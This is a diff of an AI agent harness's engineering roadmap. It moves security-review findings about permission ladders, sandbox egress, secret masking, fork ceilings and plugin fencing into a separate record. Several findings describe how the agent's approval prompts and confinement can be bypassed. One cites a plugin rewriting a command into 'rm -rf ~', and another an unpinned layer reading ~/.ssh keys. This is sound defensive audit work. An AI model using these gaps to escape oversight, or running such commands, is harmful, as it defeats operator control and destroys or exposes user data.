-- Where: `tools/src/adjudicate.rs:533,570,593-608,2406-2421,3508-3533,3638-3660`; `tools/src/mode.rs:55,275-280,651`.
-- Claim: the Once and normal ladders are identical. `exec_options` ignores `mode.grants`, and recording AllowSession never reads it. The comment at `:2406-2408` claims a guard that the recording site lacks, while `once_only_options` (`:593-595`) says the session rung is deliberate.
-- Change: decide what Once means (decision 2). Then derive the ladder and the recording rule from one builder with `label` and `scope` parameters.
-- Sources: A2-F4, P8-F8. A2 r1 fable, A2 r1 Kimi, A2 r2 opus, A2 r2 sonnet, A2 r2 DeepSeek, P8 r1 Kimi, DeepSeek (supplementary).
-- Test: per the decision, `a_once_point_records_no_session_grant`.
-
-### I30. Always-ask is admitted by the mode inside any sandbox boundary
-- Status: UNVERIFIED. Severity: medium.
-- Where: `tools/src/mode.rs:486-492`; `tools/src/adjudicate.rs:3431`; `tools/src/intent.rs:2409-2467`.
-- Claim: `admits_unasked` admits any `Tier::AlwaysAsk` whenever the boundary is not Operator, and ignores the access disposition. "Asks every time" on the card is false inside a sandbox mode. The named WRITES_ALLOWED point is Operator, so it is safe.
-- Change: add `&& self.disposition(access) == Disposition::Admit` to the arm. Whether the rule or the boundary decides is policy.
-- Sources: A2-F6. A2 r1 fable, A2 r1 Kimi.
-- Test: a custom Structural mode with `exec=Ask` must ask before `sudo`.
-
-### I31. The reviewer probe admits Unknown intent and Temp writes
-- Status: UNVERIFIED. Severity: medium.
-- Where: `tools/src/adjudicate.rs:1545-1565,3466,3474-3476`; tests `outcomes.rs:1062-1075`.
-- Claim: at allow-all, `a_reviewers_probe` admits `Intent::Unknown` (rclone, lftp, any oddly named binary) and `Region::Temp`. Its basis text "it only looks, writes or runs" is false for Unknown.
-- Change: drop Unknown from the probe. Make Temp read-only or private. Add rclone and lftp to the intent table.
-- Sources: A2-F7, P9-F10. A2 r1 GLM, P9 r1 opus, P9 r2 GLM, DeepSeek (supplementary).
-- Test: `a_reviewers_probe_asks_for_an_unknown_program`.
-
-### I32. `admit_unasked` keeps every admitting rung for plugin tools
-- Status: UNVERIFIED. Severity: medium.
-- Where: `tools/src/adjudicate.rs:2450,2812-2818,3363,3430,3493,3508`; `tools/src/plugins/tool.rs:229-266`.
-- Claim: `admit_unasked` turns off only the breaker and the adjudicator. A tool from an unpinned project layer, carrying caps it declares itself, is admitted by the mode arm at writes-allowed with no breaker and no row.
-- Change: the unasked ladder admits only by permission rules.
-- Sources: A2-F8. A2 r1 GLM (uncontested).
-- Test: `an_unpinned_layer_tool_is_not_admitted_by_the_mode_arm`.
-
-### I33. Gate ladder hygiene: stale docs, sibling decide sites, twins, dead rows, silent drops, a missing git verb
-- Status: UNVERIFIED, except (f), which the integrator verified. Severity: low.
-- Where and claims:
-  - (a) `docs/boundary-and-adjudication.md` 4l is stale against the code (A2-F5).
-  - (b) `ask_to_see`, `grant_memory` and `grant_perimeter` are sibling decide sites that skip the breaker and `record` (A2-F13).
-  - (c) `OptionKind::is_allow` and `admits` are twins, and `OptionKind` and `OnTimeout` are hand-mapped in sessionlog (A2-F12).
-  - (d) All `gh` seed rows are dead because `gh` is in AUTHENTICATES (A2-F11).
-  - (e) An `allow_session` answer is dropped silently when `session_grant` errs (A2-F10).
-  - (f) Lead L14: the read-only git list (`tools/src/intent.rs:1285-1289`) already holds `merge-base`, `rev-list`, `ls-tree`, `cat-file` and `for-each-ref`. Only `git cherry` is missing.
-- Change:
-  - (a) Rewrite 4l from the code after the batch, numbering the arms the same in the doc and the code.
-  - (b) Route the three sites through `record`.
-  - (c) Keep one predicate, and add an exhaustive mapping test.
-  - (d) Drop or document the rows.
-  - (e) Record the failure in the audit row and in `options_note`.
-  - (f) Add `cherry` to the Inspect arm.
-- Sources: A2 as listed, L14.
-- Test: `git_cherry_is_inspect`, plus one per item.
-
-### I34. A parent's narrowing reaches a child only between batches, and a failed narrowing only warns
-- Status: UNVERIFIED. Severity: medium.
-- Where: `harnessd/src/harness/turns.rs:1826,2652`; `harnessd/src/harness.rs:794,853,890-897`; `tools/src/adjudicate.rs:3098-3112`.
-- Claim: a child reads the narrowing at turn start and before each call batch. A running call and background jobs keep the wider point, and an idle child holds it indefinitely. When `narrow_to_parent` cannot move the child, the child stays wider with only a warning.
-- Change: document the per-batch guarantee in I6 of `invariants.md` now. Follow-ups: fan the narrowing out from `set_mode_consented` to live children through the registry, and re-gate or kill background jobs. On a failed narrowing, fall back to the narrowest point the seat carries, or refuse the next call.
-- Sources: P8-F6, P8-F10, A4-F11, A4-F15. P8 r1 GLM, P8 r2 opus, P8 r1 fable, P8 r2 DeepSeek, A4 r2 sonnet, DeepSeek (supplementary).
-- Test: `a_failed_narrowing_refuses_the_next_call`.
-
-### I35. The R306 tests prove less than they claim
-- Status: UNVERIFIED. Severity: medium (test gap).
-- Where: `harnessd/src/harness/tests/child_mode.rs:37-129`; `harnessd/src/sessions.rs:4888`.
-- Claim: nothing drives the worker door. Both tests return early without a GGUF. Both hand the live cell in, so they cannot reach the reopen path (I24). None crosses a shape or a permission rule (I18, I23).
-- Change: add a worker-door test that asserts no project row is written. Panic instead of returning when the GGUF is absent, or build the child without a vocabulary. Add the reopen and shape tests named in I18 and I24.
-- Sources: P8-F7. P8 r1 fable, P8 r2 DeepSeek, P8 r1 GLM, P8 r1 Kimi.
-- Test: deleting `sessions.rs:4888` must turn the suite red.
-
-### I36. A fork is stored with no parent and origin operator
-- Status: UNVERIFIED (cite verified in A4 and A10 syntheses). Severity: medium because of the limit-hook path.
-- Where: `tokencore/src/store.rs:2874-2882`; `harnessd/src/harness/fork.rs:91-113`; `harnessd/src/harness/limit_hook.rs:180-185,332-368`; `sessionlog/src/hub.rs:755`.
-- Claim: fork hardcodes `parent_session_id: None` and origin `operator`, and drops the source's grants. The `limit_decide new_session` fork continues a live turn there, as a root with no ceiling. It also leaves the old session's queue and `handed_back` on the limited model, and each of those can trigger the hook and fork again (A1-F6, HYP). Lead L19 is this item.
-- Scenario: a read-only child hits a limit, the hook forks it, and the continuation opens as a root at the project row and runs wide.
-- Change: carry `parent_session_id`, origin and point into the forked row. A fork of a child opens under I24's rule. Move the queue and `handed_back` into the fork, and make the hook idempotent per episode.
-- Sources: A4-F8, A10-F9, A1-F6, L19. A4 r1 GLM, A4 r2 opus, A4 r2 DeepSeek, A1 r1 opus, A10 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `a_fork_of_a_child_keeps_its_parent_and_ceiling`, and `a_new_session_fork_takes_the_queue_with_it`.
+**Findings.** I29, I30, I31, I32, I33, I34, I35, I36, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R340 - confinement remainder: tight egress, job-capture-only masking, env-only credential fence
 
 **Status:** built 2026-11-16 on `remote/28651092`. Three findings: I39 and I40 are closed, I41 is disproved by its own adversarial test. Every proving test is green in `cargo test -p letibot-tools`, `-p leticode-config` and `-p letibot-config-ref`, and `cargo clippy -p <each> --tests -- -D warnings` is clean. Filed 2026-11-16 from the review at `9e9312b06` (line numbers at the snapshot; none of the 5 commits on main since closes these). Theme row of `docs/review/2026-11-16-letibot.md` section 7. Findings: I39, I40, I41. Record: `docs/review/2026-11-16/INTEGRATION.md`. Store schema untouched (main is at 55).
 
-**Scope.** Decision 7: tight egress Denied by default, granted per seat (C10). Wide stays Host by ruling. I39 is taken by R365 (the grant is a proxy allowlist) and I40 by R362 (one redactor). I41 stays here. Design: `docs/design/automode-and-broker.md`.
-
 **Proving tests.** the tests named in each entry. Each fails on the snapshot, except I41's, whose finding's own rule is to fix only if the leak shows.
 
-**Size.** M. **After:** B5 (R325).
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Built.**
 - I39, `56c88e06`. `network_rule` takes the level: a tight seat is `Egress::Denied` whatever the mode seats, and the wide seat keeps the host's network by ruling. The operator's way out is `network = ["why"]` in `[boundary]` or `[perimeter.<name>]`, refused in a project file, applied by `boundary::apply`. The ssh placement passes the session's level, so a child placed on a remote host is denied too. Tests: `a_tight_seat_denies_the_network_whatever_the_mode_seats`, `the_wide_seat_keeps_the_hosts_network`, `a_granted_seat_may_reach_the_network`, `a_project_file_may_not_grant_the_network`, `a_production_tight_seat_can_enclose` (all in `crates/tools/tests/tight_egress.rs`) and `the_free_admit_fires_on_a_production_tight_boundary`, which takes its egress from `seat_view` so a regression cannot pass the way the hand-built fixtures do. `a_tight_seat_command_cannot_reach_loopback` is the end-to-end half and skips on a box with no user namespace, which this one is (see residue). Residue: the grant does not travel to a remote placement, so a child on another host can be denied egress and cannot be granted it.
@@ -1544,32 +897,7 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 
 **What is not proven on this box.** This seat has no `/sys`, so there is no cgroup v2 and no unprivileged user namespace: every test that must enter a boundary skips loudly through `apparatus::absent`, `LETIBOT_REQUIRE_APPARATUS=1` turns that into a failure, and `a_tight_seat_command_cannot_reach_loopback` is the one entry in this row that has never run for real. The rule it would measure is proved by the other four tests, which read the egress and the admit rather than a socket.
 
-**Findings, verbatim from the record.**
-
-### I39. Tight seats get host egress, so the boundary's free admit never fires in production
-- Status: UNVERIFIED (Kimi's reading verified by the A3 synthesizer). Severity: medium.
-- Where: `tools/src/exec/seat.rs:160-173,493`; `tools/src/exec/confine.rs:1132,2703`; `tools/src/backend.rs:578`; `tools/src/adjudicate.rs:1578`; `tools/src/adjudicate/tests/boundary.rs:22-23,134`.
-- Claim: `network_rule` gives `Egress::Host` whenever the mode seats the network, which is every built-in mode that executes. Tight children share the host netns, including loopback (llama-server, daemon listeners). `Boundary::encloses()` requires `Egress::Denied`, so the no-card admit at `adjudicate.rs:1578` is tested only on a fixture boundary.
-- Scenario: a carded `cargo test` in a tight child runs a `build.rs` that opens a socket.
-- Change: tight seats get `Egress::Denied` unless the operator grants egress (decision 7). This also makes the free admit reachable. Add a production-shaped test through `seat_view` and `probe`. Wide stays Host by ruling.
-- Sources: A3-F5, A3-F6. A3 r1 opus, A3 r1 sonnet, A3 r2 GLM, A3 r2 fable, A3 r2 Kimi, DeepSeek (supplementary).
-- Test: `a_tight_seat_command_cannot_reach_loopback`, plus `the_free_admit_fires_on_a_production_tight_boundary`.
-
-### I40. Secret masking covers job capture only
-- Status: UNVERIFIED. Severity: medium.
-- Where: `tools/src/exec/seat.rs:23-40,583`; `tools/src/exec/jobs.rs:1024`; `tools/src/exec/host.rs:2867`; `tokencore/src/store.rs:3046-3070`.
-- Claim: `SecretEnv::mask` is an exact-substring match of 8 bytes or more, applied only to job capture. File-tool results and `append_item` write unmasked. Encodings defeat it.
-- Change: run the mask over every tool result before `append_item`. Document that it is not a boundary.
-- Sources: A3-F7. A3 all positions, DeepSeek (supplementary).
-- Test: `env > x; read x` stores no masked token.
-
-### I41. A child's credential fence is environment-only
-- Status: UNVERIFIED (HYP). Severity: low.
-- Where: `tools/src/exec/seat.rs:481-490`.
-- Claim: a `credential.<url>.helper` in a granted git dir's config may survive the `GIT_CONFIG_*` reset.
-- Change: write an adversarial test first. Fix only if the push succeeds.
-- Sources: A3-F12. A3 r1 DeepSeek concession.
-- Test: `a_repo_credential_helper_is_not_honoured_in_a_child`.
+**Findings.** I39, I40, I41, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R341 - rows, the journal and warnings: head before store, jobs marked delivered first, operator-only rows in the model transcript, warnings, the room store
 
@@ -1699,49 +1027,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 
 **Status:** built 2026-11-16 on `remote/30004413`: `c4e67f01` (I54), `e9e17ac8` (I55) and `67049f75` (I56). All three findings are closed. The schema was 56 and is 57 (`import_pending`, additive). Filed 2026-11-16 from the review at `9e9312b06` (line numbers at the snapshot; none of the 5 commits on main since closes these). Theme row of `docs/review/2026-11-16-letibot.md` section 7. Findings: I54, I55, I56. Record: `docs/review/2026-11-16/INTEGRATION.md`.
 
-**Scope.** One `BATCHES` constant, `place_of` derived.
-
 **Proving tests.** the tests named in each entry. Each fails on the snapshot.
 
-**Size.** M. **After:** B12 (R332).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I54. Migrations are not transactional, and their probes swallow errors
-- Status: UNVERIFIED (verified in A5's synthesis for v19). Severity: medium.
-- Where: `tokencore/src/store.rs:1848-1952,2027-2036,2264-2289,2588-2630`; `tokencore/src/store/split.rs:442-459`; `tokencore/src/procs.rs:238`.
-- Claim:
-  - Each arm autocommits. The version stamp is a DELETE then an INSERT. There is no cross-process lock.
-  - A concurrent opener can see an empty version and run the fresh path, which writes project tables into a split `shared.db` (A5-F2).
-  - v2 and v4 `ADD COLUMN` have no existence check (P4-F9).
-  - Probes use `.unwrap_or(false)`, so an error skips the arm while 51 is stamped (A5-F4).
-  - Multi-column batches guard on the first column only. A kill after the first ALTER of v19 loses `auto_compact_after` for good (A5-F5).
-- Change: one `BEGIN IMMEDIATE` around re-reading the version, `migrate_from`, `repair_queue_mute` and a single UPDATE stamp. Treat "tables present, version empty" as corrupt, not fresh. `has()` returns `Result<bool>`. Pass `StoreFile` into `migrate_from`. Guard v2 and v4.
-- Sources: P4-F9, A5-F2, A5-F4, A5-F5. P4 r1 GLM, A5 r1 opus, A5 r1 sonnet, A5 r2 fable, A5 r2 GLM, A5 r2 Kimi, DeepSeek (supplementary). A5 r1 DeepSeek's "benign" was rebutted.
-- Test: `a_kill_inside_v19_does_not_lose_a_column`, and `two_openers_racing_migrate_create_no_stray_tables`.
-
-### I55. The split schema can drift between the files
-- Status: UNVERIFIED. Severity: medium.
-- Where: `tokencore/src/store.rs:1893-1911,2582-2620`; `tokencore/src/store/split.rs:160-181,307-310`; `tokencore/src/store/split_coverage_tests.rs:13-31,139-156`; `tokencore/src/store/split_tests.rs:83,106,449`; `tokencore/src/store/grants.rs:91`.
-- Claim:
-  - v47 (`recall_unit`) and v50 (`session_grant`) are unguarded, so `shared.db` gains empty project tables, and an unrouted read returns empty instead of failing (A5-F3).
-  - The fresh path and `split::batches()` are two lists, so index- and trigger-only drift is uncaught (A5-F8).
-  - Cross-file FKs are stripped by exact strings (A5-F9).
-  - The coverage scan omits `grants.rs` and misses `tx.`, `conn.` and formatted table names (A5-F6, A5-F13).
-  - No test compares a migrated store with a fresh one (A5-F14).
-- Change: guard both arms with `split::holds`. One `BATCHES` constant that both paths loop over. Assert `schema_sql(Project)` holds no `REFERENCES session`. Derive SOURCES from the mod list. Add a migrated-versus-fresh schema test per recorded old version.
-- Sources: A5-F3, A5-F6, A5-F8, A5-F9, A5-F13, A5-F14. A5 all positions, DeepSeek (supplementary).
-- Test: `migrating_from_each_recorded_version_equals_a_fresh_set`.
-
-### I56. Import and migrate do not know about the split
-- Status: UNVERIFIED. Severity: medium/low.
-- Where: `tokencore/src/store/transfer.rs:241,312-338`; `letibot/src/migrate.rs:664,1805-1819,2021`.
-- Claim: `import_tx` commits the project file and `shared.db` one after the other, with no half-import marker (A5-F7). `letibot migrate` opens `sessions.db` by path and creates a stray full-schema file on a split box (A5-F10).
-- Change: write a pending marker before the import and clear it last. Open through `StoreAt` or `open_set_existing`.
-- Sources: A5-F7, A5-F10. A5 r1 opus, A5 r1 DeepSeek, A5 r2 GLM, A5 r2 Kimi, DeepSeek (supplementary).
-- Test: `a_crash_after_the_project_commit_is_detected_on_retry`.
+**Findings.** I54, I55, I56, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 **What was built.**
 
@@ -1873,41 +1163,7 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - A same-protocol rebuild is invisible in the numbers; `daemon_stale_line` catches it by mtime, and only on Linux for `--status`/attach, because a build id would be a second mechanism for the same job (I36). Said here rather than built.
 - The daemon speaks 79 and the corpus is captured at 79, but `scripts/wire-skew.sh`'s default refs are computed from history, so the first run after this branch lands picks `79^` as the older build by itself. Its last green run was against 78 before the bump.
 
-**Findings, verbatim from the record.**
-
-### I68. Meaning changed under an unchanged protocol number
-- Status: UNVERIFIED (commit pair checked in P1). Severity: medium.
-- Where: `sessionlog/src/protocol.rs:246,655-657`; `tui/src/app/composer.rs:243`; commits `6f538d24a`, `8d4943a7a`, `7ab2f03fd`; `bridge/src/head.rs:822`.
-- Claim: `Prompt.delivery` was added after 76 was already set, and `Speaker::Peer` was added at 74. Equal numbers make `protocol_skew` return None. A pre-`from` daemon would store a newer bridge's peer prompts as Operator (P2-F9). L20 is this item.
-- Scenario: a new TUI talks to an early-76 daemon. Tab-to-queue lands as a steer in the running turn, and nothing is said.
-- Change: bump whenever an absent or unknown value changes behaviour, enforced in the bump test. Put `Caps.features` in Hello, have the daemon echo the accepted set, and send Queue only when it was echoed. The bridge refuses `prompt_from` below the `from` protocol.
-- Sources: P1-F3, P2-F9, L20. P1 all positions, P2 r1 GLM, P2 r2 opus.
-- Test: `a_queue_prompt_is_not_sent_to_a_daemon_that_did_not_echo_the_feature`.
-
-### I69. Bridge, fleet and acp send frames with no per-frame version gate
-- Status: UNVERIFIED. Severity: medium.
-- Where: `bridge/src/head.rs:593-607,823,2252,2360`; `bridge/src/tools.rs:893`; `bridge/src/fleet.rs:216`; `acp/src/session.rs:288`; `tui/src/app/session.rs:585-591`; `sessionlog/src/server.rs:2146-2157`.
-- Claim: `daemon_protocol` is used only for `is_readable`. `DriverTodos` (77) is sent unconditionally. A v76 daemon answers Bye and drops the socket, which closes a live package's held head.
-- Change: a per-frame minimum version, or an echoed cap, checked before every send. Return a refusal to the tool and never drop the socket. Keep the TUI lock as the fallback (conflict C3).
-- Sources: P1-F4. P1 all positions.
-- Test: `leticode_todo_against_v76_refuses_and_keeps_the_head`.
-
-### I70. The room protocol stayed at 12 while it gained frames and fields
-- Status: UNVERIFIED. Severity: medium.
-- Where: `room/src/wire.rs:12-19,166-170,261,657`; `room/src/server.rs:4516-4525`; `room/tests/wire.rs:212`; commits `5e721bbad`, `cfae85130`.
-- Claim: `MayPrompt` and `Hello.share/family` were added under 12. A mid-series coordinator reads `may_prompt` as `ReadFrame::Bad` and closes the connection. An older one drops `family` silently.
-- Change: gate `may_prompt` on `welcome.protocol`, and treat a Bad-close as a refused frame. Go to 13 at the next release point, keep `OLDEST_CLIENT=11`, and fix the comment. Replay a recorded v11 session against the coordinator.
-- Sources: P1-F6, A8-F8. P1 r1 opus, P1 r1 sonnet, P1 r2 GLM, P1 r2 Kimi, A8 r1 GLM, DeepSeek (supplementary).
-- Test: `a_v12_mid_series_coordinator_refuses_may_prompt_by_name`.
-
-### I71. Skew and stale builds are invisible to the operator
-- Status: UNVERIFIED (P1-F8 verified by grep). Severity: medium.
-- Where: `sessionlog/src/server.rs:737,2199,2204`; `scripts/letibot:1613-1628`; `sessionlog/src/protocol.rs:251,259`; `~/Projects/rano/rano/src/letibot.rs:26,198,858`.
-- Claim: the daemon's "say" about skew is only an `eprintln!` to `harnessd-<key>.log`, while the same function uses `hub.warn` for lesser facts. The launcher's skew arm matches "protocol version", which no emitted text contains, so it never fires. rano declares 72 and compares nothing. Nothing tells the operator their daemon or plugin binary is older than the installed build (L24, L30).
-- Scenario: rano ran a daemon through batches 10-12 that predated the installed build (L24). The bridge plugin spoke 74 against 78 daemons (L30).
-- Change: `hub.warn("protocol_skew", ..)` deduped per head at attach. The launcher reads the protocol from `--where --json`. A "newer build installed, restart to pick it up" notice, raised by comparing the running binary's build id with the installed one. rano gets one comparison.
-- Sources: P1-F7, P1-F8, L24, L30. P1 r1 DeepSeek, P1 r2 Kimi, P1 r1 opus, DeepSeek (supplementary).
-- Test: `a_skewed_attach_raises_a_protocol_skew_warning`, plus the launcher test for `--where --json`.
+**Findings.** I68, I69, I70, I71, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R345 - facts with no read time: status lag, todo waits, undated polls, repeated usage rows, the triple park line
 
@@ -1933,13 +1189,9 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - The usage row now changes on every reading (its read time), so each poll pushes one `Settings` frame per attached head, every 2 min.
 - F14, F11's resync half and R319's left are in R345a.
 
-**Scope.** I74 is R319's remainder (STALE-F7, non-job waits). Leads 35 and 36 are filed here (below). Absorbs R310's left (`limits[]` read only when `usages` is empty, STALE-F9).
-
 **Proving tests.** the tests named in each entry, `a_usage_warning_is_said_once_per_crossing`, `one_park_is_one_line_in_local_time`. Each fails on the snapshot.
 
-**Size.** M. **After:** B15 (R335).
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R310 (stale usage figure, ca998ddee) is folded here: `kimi_limits` is still read only when `usages` is empty (`provider/src/usage_poll.rs:50-51`, STALE-F9 in I75). R319 (job waits resolved at delivery, dcfa1c373 on main) is closed; its own left is filed here: a row freed at delivery is askable by the plan check at once, not after the digest grace's extra turn, and a wait attached to a job after its settlement was delivered is still resolved by the sweep with a note.
 
@@ -1956,40 +1208,7 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - Claim: the parked line ("until 14:07 (local time)"), the sticky limit notice ("until 13:07:09 UTC") and the status line ("13:07:09 UTC ... 10:27:25 UTC") say one park three times in mixed time zones. Wanted: one line, in local time.
 - Test: `one_park_is_one_line_in_local_time`.
 
-**Findings, verbatim from the record.**
-
-### I73. The bridge's status model is updated only at turn start
-- Status: UNVERIFIED. Severity: medium.
-- Where: `bridge/src/head.rs:947-952,1003,1116,1342`; `bridge/src/tools.rs:1173`.
-- Claim: the Settings arm reads only `idle_exit`, so `leticode_status.model` misses a switch until the next turn.
-- Change: read `MODEL_KEY` from the Settings rows, as the TUI does.
-- Sources: STALE-F6. STALE r1 fable, STALE r2 opus, STALE r2 DeepSeek, STALE r2 sonnet.
-- Test: `status_shows_the_model_right_after_leticode_model`.
-
-### I74. Non-job todo waits survive a restart, and the pane prints them verbatim
-- Status: UNVERIFIED. Severity: medium. Not fixed by R319 (`dcfa1c373`), which handles job waits only.
-- Where: `tools/src/builtins/todo.rs:726-743`; `tui/src/ui/panes/todos.rs:360-367,489-496`; `harnessd/src/harness/nags.rs:139-146`.
-- Claim: `resolve_job_waits` resolves only Job needs. Child, pid and monitor waits are judged live by the nag but drawn stale by the pane.
-- Change: generalise the open-time resolution to child, pid and monitor waits.
-- Sources: STALE-F7. STALE r1 fable, STALE r2 DeepSeek.
-- Test: `a_monitor_wait_is_resolved_at_open_after_restart`.
-
-### I75. Pull-only and polled facts carry no read time
-- Status: UNVERIFIED. Severity: medium/low.
-- Where: `tui/src/app/events/frames.rs:112,234-243`; `tui/src/app/surface.rs:371-376`; `sessionlog/src/event.rs:172-176`; `sessionlog/src/server.rs:1040-1045`; `provider/src/usage_poll.rs:50-52`; `harnessd/src/harness/usage.rs:47,190-205`; `sessionlog/src/registry.rs:2062-2076`; `sessionlog/src/hub.rs:64,1144-1146,1264-1276`; `harnessd/src/term.rs:370,564`; `harnessd/src/harness.rs:1544-1549`; `tui/src/ui/header.rs:55-98`; `tui/src/ui/screen.rs:18-27`; `tui/src/app/scroll.rs:158-162`.
-- Claim:
-  - Seat boards are refreshed only by a Todos reply (STALE-F8).
-  - Kimi `limits[]` is read only when `usages` is empty, the open part of R310 (STALE-F9).
-  - The usage row's age is baked in as text (STALE-F10).
-  - Fact frames share the 256-entry side queue with TermOutput and are evicted silently (STALE-F11).
-  - The waiting-on line has no time (STALE-F12).
-  - The header's model falls back to the config default, unmarked (STALE-F13).
-  - ctrl-p holds the header and status too (STALE-F14).
-  - The session count is pull-only (STALE-F15).
-  - L21: the usage lock is held across a blocking HTTP request. No panel verified it. It belongs to the usage poller in `harnessd/src/harness/usage.rs`.
-- Change: apply I48 of the invariants by class. Polled and pull-only copies carry a read time and draw their age. Event-fed copies get a resync on a lost frame. Keep fact frames in latest-value slots. Merge `limits[]` and take the greater `used`, pinned with a captured Kimi body. Mark the header fallback as unconfirmed. Hold only the body under ctrl-p. Release the usage lock before HTTP.
-- Sources: STALE-F8 to STALE-F15, L21. STALE as listed, DeepSeek (supplementary).
-- Test: one per item. Start with `a_kimi_body_with_both_shapes_reports_the_greater_used`.
+**Findings.** I73, I74, I75, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R345a - R345 remainder: ctrl-p holds only the body, a lost side frame resyncs, R319's freed-at-delivery grace
 
@@ -2016,38 +1235,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - `~/Projects/letibot/letibot/target/release/letibot` is a stale pre-rename ELF; that box's `check-dist-names.sh --built` fails until it is deleted.
 - `tests/launcher.sh` is not shfmt-clean on w4-base (34 hunks, none in this branch's lines).
 
-**Scope.** Decision 15: a stale ELF fails `check-dist-names.sh`. Decision 17: bash with twins deleted one by one now, the Rust shim after the phase.
-
 **Proving tests.** the tests named in each entry. Each fails on the snapshot.
 
-**Size.** M. **After:** B11 (R331).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I82. The real scope join after a good probe has no bound
-- Status: UNVERIFIED. Severity: medium.
-- Where: `scripts/letibot:235-236,317-346,2998-3005,3078-3086`; `letibot/tests/no_hang.rs:104-107`.
-- Claim: `systemd-run --user --scope` after a good 2-second probe can hang a one-shot indefinitely. On give-up, the daemon path leaves an orphan that starts a harnessd later. Unanswered probe dirs are kept forever. The stub answers at 6 seconds, so neither case is tested.
-- Change: bound the scope join, falling back to unscoped, and kill the orphan on give-up. Sweep unanswered probe dirs. Add stub cases: fast for `true`, hanging for the real scope, and never answering.
-- Sources: P7-F9, P7-F10, P7-F11. P7 all positions, DeepSeek (supplementary).
-- Test: `a_hanging_real_scope_does_not_hang_the_one_shot` in `no_hang.rs`.
-
-### I83. Bash re-derives Rust rules: socket hash, binary locations, dist checks
-- Status: UNVERIFIED. Severity: medium/low.
-- Where: `scripts/letibot:371-373,752,816`; `letibot/src/whereis.rs:3-6`; `bridge/src/daemon.rs:58`; `scripts/check-dist-names.sh:36,157-161`; `tests/install.sh:203-207`; `leticode-config/src/reference_tests.rs:83-97`.
-- Claim:
-  - The launcher re-hashes the socket path, which `whereis.rs` forbids (P7-F14).
-  - Install writes `~/.local/bin` while the launcher runs the checkout's `target/release`, so the R308 hotfix never ran (L25).
-  - A stale ELF exits 0 by design (P7-F16).
-  - Interpolated matrix triples are dropped (P7-F17).
-  - The config-ref probe misses five tables (P7-F15).
-  - The launcher as a whole is a second copy of Rust placement (P7-F18).
-  - A dash wrapper dropped hyphenated env names (L26).
-- Change: ask `letibot-multi where --json` for the socket. One binary location with one reader. Resolve or reject interpolated triples. Add the five tables. Audit `sh` wrappers for hyphenated env names. Shrinking the launcher to a shim is a follow-up (decision 17).
-- Sources: P7-F14 to P7-F18, L25, L26. P7 as listed.
-- Test: `the_launcher_socket_equals_where_json`, and `install_and_launcher_name_the_same_binary`.
+**Findings.** I82, I83, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R347 - gate-at, queue doors, queue structure, tests reading live state
 
@@ -2209,54 +1401,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 
 **Box facts met.** `~/.cargo` is read-only and does not hold this tree's rano rev, so the work ran on a copy of it under `$HOME` with network (the rev fetches by sha). `bridge`'s `mcp::tests::initialize_answers_the_revision_and_names_the_server` fails on this checkout (612 bytes: the instructions count the folder name) and does so with this branch's changes stashed. `fleet::tests::a_renamed_operator_session_of_another_folder_is_listed_as_theirs` fails under a full parallel lib run about one time in three and passes alone.
 
-**Scope.** I99: patch now with real-server tests and a typed decode of recorded frames; the rebuild on `letibot_room::Client` is a follow-up (C14).
-
 **Proving tests.** the tests named in each entry. Each fails on the snapshot.
 
-**Size.** M. **After:** B13 (R333), B14 (R334).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I96. Plugin looks and rewrites are not fenced
-- Status: UNVERIFIED (A10-F5 narrowing and A10-F10 verified by A10's synthesizer). Severity: medium.
-- Where: `harnessd/src/plugins/look.rs:57-100`; `harnessd/src/plugins/pane.rs:89,314,371`; `harnessd/src/plugins/conditions.rs:140,190-195`; `harnessd/src/plugins/hook.rs:530,841-855`; `harnessd/src/plugins/tool.rs:82-84,142-150,674-686`; `plugins/src/manifest.rs:72`; `tools/src/builtins/external/mcp.rs:106,166`.
-- Claim:
-  - Pane and condition looks run with no session view and no trust check, so `read:~/.ssh` on an unpinned layer reads the key (A10-F5).
-  - A pinned layer's exec look runs before the gate (A10-F6).
-  - `only_smaller` checks only top-level keys, so `{"command":"ls"}` rewritten to `{"command":"rm -rf ~"}` passes (A10-F10).
-  - `Http` is a phantom capability that would gain network with no re-pin (A10-F16).
-  - MCP tool descriptions reach the model verbatim (A10-F18).
-- Change: pass the session view into `look::run`, or honour ReadPath only for trusted layers. Exec looks always pass `gate.admit_unasked`. Make `only_smaller` recursive and refuse changed values. Refuse `http:` at admission. Quarantine server descriptions as the results already are.
-- Sources: A10 as listed. A10 r1 fable, A10 r2 DeepSeek, A10 r1 GLM, A10 r1 Kimi, DeepSeek (supplementary).
-- Test: `only_smaller_refuses_a_changed_value` (table test), and `an_unpinned_pane_look_cannot_read_outside_the_view`.
-
-### I97. Plugin and MCP runtime bounds, and the missing tests around them
-- Status: UNVERIFIED. Severity: medium.
